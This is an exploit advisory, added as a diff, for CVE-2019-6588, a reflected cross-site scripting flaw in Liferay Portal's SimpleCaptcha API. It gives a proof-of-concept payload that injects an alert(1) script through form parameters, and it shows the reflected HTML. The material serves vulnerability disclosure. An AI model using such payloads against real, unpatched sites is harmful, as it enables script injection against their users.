@@ -1,0 +1,26 @@
+# Exploit Title: Liferay Portal < 7.1 CE GA4 / SimpleCaptcha API XSS
+# Date: 04/06/2019
+# Exploit Author: Valerio Brussani (@val_brux)
+# Website: www.valbrux.it
+# Vendor Homepage: https://www.liferay.com/
+# Software Link: https://www.liferay.com/it/downloads-community
+# Version: < 7.1 CE GA4
+# Tested on: Liferay Portal 7.1 CE GA3
+# CVE: CVE-2019-6588
+# Reference1: https://dev.liferay.com/web/community-security-team/known-vulnerabilities/liferay-portal-71/-/asset_publisher/7v4O7y85hZMo/content/cst-7130-multiple-xss-vulnerabilities-in-7-1-ce-ga3
+# Reference2: https://www.valbrux.it/blog/2019/06/04/cve-2019-6588-liferay-portal-7-1-ce-ga4-simplecaptcha-api-xss/
+
+
+Introduction
+In Liferay Portal before 7.1 CE GA4, an XSS vulnerability exists in the SimpleCaptcha API when custom code passes unsanitized input 
+into the “url” parameter of the JSP taglib call <liferay-ui:captcha url=”<%= url %>” /> or <liferay-captcha:captcha url=”<%= url %>” />. 
+A customized Liferay portlet which directly calls the Simple Captcha API without sanitizing the input could be susceptible to this vulnerability.
+ 
+Poc
+In a sample scenario of custom code calling the <liferay-ui:captcha url=”<%= url %>” /> JSP taglib, appending a payload like the following to the body parameters of a customized form:
+ 
+&xxxx%22%3e%3cscript%3ealert(1)</script> 
+ 
+The script is reflected in the src attribute of the <img> tag, responsible of fetching the next available captcha:
+ 
+<img alt=”xxx” class=”xxxx” src=”xxxxxx“><script>alert(1)</script>=” />
